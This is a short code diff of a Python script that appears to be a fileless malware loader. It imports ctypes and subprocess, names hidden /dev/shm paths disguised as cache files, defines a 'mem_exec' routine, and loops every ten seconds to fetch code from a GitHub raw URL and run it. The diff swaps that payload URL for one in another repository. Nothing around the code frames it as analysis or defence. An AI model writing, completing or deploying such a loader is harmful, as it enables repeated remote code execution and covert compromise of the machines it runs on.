@@ -1,6 +1,6 @@
 import os, time, subprocess, urllib.request, ctypes
 
-URL = "https://raw.githubusercontent.com/t56r4re/34553/main/sds.py"
+URL = "https://raw.githubusercontent.com/mimikr00t/superecon/refs/heads/main/modules/core.py"
 LOC = ["/dev/shm/.cache1", "/dev/shm/.cache2"]
 
 def mem_exec(payload):
@@ -21,3 +21,4 @@ def fetch_and_run():
 while True:
     fetch_and_run()
     time.sleep(10)
+
